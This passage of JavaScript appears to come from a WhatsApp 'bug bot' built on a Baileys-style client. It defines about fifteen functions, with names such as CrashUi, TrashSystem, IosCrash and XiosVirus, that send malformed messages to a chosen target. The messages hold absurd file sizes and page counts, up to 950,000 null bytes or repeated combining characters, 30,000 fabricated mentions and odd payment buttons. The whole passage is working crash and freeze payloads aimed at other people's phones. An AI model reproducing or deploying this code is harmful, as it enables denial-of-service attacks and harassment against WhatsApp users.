													"title": "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
													"rows": []
												}]
											}
										},
										{
											name: "call_permission_request",
											buttonParamsJson: {}
										}
									],
								},
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiXLoc
				}
			);
			await VxoZap.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function InVisiXz(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiX
				}
			);

			await VxoZap.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function ClPm(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);

			await VxoZap.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "ꦾ".repeat(77777)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);

			await VxoZap.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function CrashUi(X, Qtd, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤" + "ꦾ".repeat(50000)
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: Qtd
				}
			);

			await VxoZap.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function ZnX(X, Txt, Amount, Ptcp = true) {
			await VxoZap.relayMessage(X, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: Txt,
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(Amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function CrL(X, Qtd, Txt, Ptcp = true) {
			let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: Txt
							},
							nativeFlowMessage: {
								messageParamsJson: " znx guarantees all phones :) \n\n\n I know, you tried to copy this bug with m.quoted/m.message, right ? "
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: X,
				quoted: Qtd
			});

			await VxoZap.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function ZnXIvS(X, Ptcp = true) {
			let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
							},
							nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: " 𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉 "
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: X,
				quoted: Qrad
			});

			await VxoZap.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function OutOff(X, Ptcp = true) {
			let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ▾ ༑̴⟆̊⿻‏‎‏‎‏‎‏‏‎‏‎‏‎‏",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: ""
							},
							nativeFlowMessage: {
								messageParamsJson: " ZnX Company Tagline Here!! \n\n\n You Stupid?? ",
								buttons: [{
									name: "payment_info",
									buttonParamsJson: `{\"currency\":\"IRP\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"XXX\",\"key\":\"+99999999999\",\"key_type\":\"XXX\"}}]}`
								}],
							},
						}
					}
				}
			}), {
				userJid: X
			});
			await VxoZap.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
		}

		async function CaroUsel(X) {
			await VxoZap.relayMessage(X, {
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								subtitle: "\u0000".repeat(900000),
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "",
							},
							nativeFlowMessage: {
								messageParamsJson: ""
							},
							carouselMessage: {}
						}
					}
				}
			}, {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function Gsz(X, QTD) {
			await VxoZap.relayMessage(X, {
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉" + "\u0000".repeat(900000)
							},
							nativeFlowMessage: {
								messageParamsJson: ""
							},
							carouselMessage: {}
						}
					}
				}
			}, {
				participant: {
					jid: X
				}
			});
			let XS = fs.readFileSync('./system/image/XY.webp')
			await VxoZap.sendMessage(X, {
				sticker: XS
			}, {
				quoted: QTD
			})
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function Tedex(X, QTD) {
			await VxoZap.relayMessage(X, {
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								'title': '',
								'locationMessage': {},
								'hasMediaAttachment': true
							},
							'body': {
								'text': '𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉' + '\x00'.repeat(950000)
							},
							'nativeFlowMessage': {
								'messageParamsJson': '\x00'
							},
							'carouselMessage': {}
						}
					}
				}
			}, {
				participant: {
					jid: X
				}
			});
			await VxoZap.sendMessage(X, {
				text: `ZNX INVASION\`𐁘`
			}, {
				quoted: QTD
			});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function IosCrash(LockJids) {
			await VxoZap.relayMessage(LockJids, {
				"paymentInviteMessage": {
					serviceType: "FBPAY",
					expiryTimestamp: Date.now() + 1814400000
				}
			}, {
				participant: {
					jid: LockJids
				}
			})
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function XiosVirus(jid) {
			VxoZap.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': '⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function XiosPay(jid) {
			VxoZap.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function TrashSystem(X, ThM, Ptcp = true) {
			await VxoZap.relayMessage(X, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@6281991410940".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉', url: \"https://youtube.com/PakTzy\", merchant_url: \"https://youtube.com/PakTzy\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["6281991410940@s.whatsapp.net", ...Array.from({
										length: 30000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function StuckNull(X, ThM, Ptcp = true) {
			await VxoZap.relayMessage(X, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
